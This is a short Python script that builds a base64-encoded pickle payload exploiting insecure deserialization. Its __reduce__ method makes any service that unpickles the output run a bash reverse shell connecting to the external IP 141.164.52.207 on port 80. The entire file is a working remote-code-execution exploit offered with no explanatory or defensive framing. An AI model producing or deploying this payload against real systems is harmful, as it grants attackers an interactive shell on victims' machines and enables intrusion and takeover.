import os
import pickle
import base64

class rce(object):
  def __reduce__(self):
    return (os.system, ('bash -i >& /dev/tcp/141.164.52.207/80 0>&1',))

print(base64.b64encode(pickle.dumps(rce())))